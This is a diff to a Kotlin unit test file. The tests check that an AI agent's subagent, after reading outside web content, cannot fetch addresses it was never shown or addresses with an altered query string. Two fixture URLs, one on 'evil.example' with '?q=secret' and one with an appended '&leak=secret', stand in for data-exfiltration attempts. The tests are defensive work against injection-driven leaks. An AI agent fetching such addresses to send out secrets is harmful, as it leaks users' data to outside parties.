@@ -52,6 +52,7 @@ class SubagentRunnerTest {
         pricePerCall: Double? = 0.01,
         asker: ParentAsker = ParentAsker { question, _, _ -> ParentAnswer.Answered("Answer to $question") },
         tools: List<app.jonaki.core.toolapi.Tool> = threadTools,
+        threadReadOutsideContent: Boolean = false,
     ): SubagentRunner {
         var nextId = 0
         val models = object : SubagentModels {
@@ -82,6 +83,7 @@ class SubagentRunnerTest {
             limitSettings = limitSettings,
             limitsOverride = limits,
             customTypes = customTypes,
+            threadReadOutsideContent = { threadReadOutsideContent },
             timer = clock,
             newId = { "s${nextId++}" },
         )
@@ -725,6 +727,51 @@ class SubagentRunnerTest {
 
         assertTrue(reports.all { it.text.contains("at most 3") })
         assertTrue(recorder.starts.isEmpty())
+    }
+
+    private val resultList = "1. Rain data https://rain.example/data?year=2025\n"
+    private val searchWithAddress = FakeTool("web_search", outsideSource = "search", behaviour = { ToolOutput.success(resultList) })
+
+    private fun fetchRun(threadRead: Boolean, fetchedAddress: String, searchFirst: Boolean): FakeTool {
+        val fetch = FakeTool("web_fetch", addressArgument = "url")
+        val fetchCall = call("c2", "web_fetch", "url" to fetchedAddress)
+        val turns = if (searchFirst) {
+            arrayOf(toolCallTurn(call("c1", "web_search", "query" to "rain")), toolCallTurn(fetchCall), textTurn("Done."))
+        } else {
+            arrayOf(toolCallTurn(fetchCall), textTurn("Done."))
+        }
+        runBlocking {
+            runner(
+                mapOf("researcher" to ScriptedProvider(*turns)),
+                tools = threadTools - webSearch + searchWithAddress + fetch,
+                threadReadOutsideContent = threadRead,
+            ).launch(listOf(SubagentTask("researcher", "Find rain data", extraTools = listOf("web_fetch"))), context)
+        }
+        return fetch
+    }
+
+    @Test
+    fun aSubagentOfAThreadThatReadOutsideContentCannotFetchAnAddressItWasNeverShown() {
+        val fetch = fetchRun(threadRead = true, fetchedAddress = "https://evil.example/?q=secret", searchFirst = false)
+        assertTrue(fetch.receivedArguments.isEmpty())
+    }
+
+    @Test
+    fun aSubagentOfAThreadThatReadOutsideContentFetchesAnAddressFromItsOwnSearchResult() {
+        val fetch = fetchRun(threadRead = true, fetchedAddress = "https://rain.example/data?year=2025", searchFirst = true)
+        assertEquals(1, fetch.receivedArguments.size)
+    }
+
+    @Test
+    fun aSubagentCannotFetchAnAddressThatOnlyDiffersInTheQueryAfterItReadOutsideContent() {
+        val fetch = fetchRun(threadRead = false, fetchedAddress = "https://rain.example/data?year=2025&leak=secret", searchFirst = true)
+        assertTrue(fetch.receivedArguments.isEmpty())
+    }
+
+    @Test
+    fun aSubagentOfAThreadWithoutOutsideContentFetchesAnyAddressUntilItReadsSome() {
+        val fetch = fetchRun(threadRead = false, fetchedAddress = "https://anything.example/x", searchFirst = false)
+        assertEquals(1, fetch.receivedArguments.size)
     }
 }
 
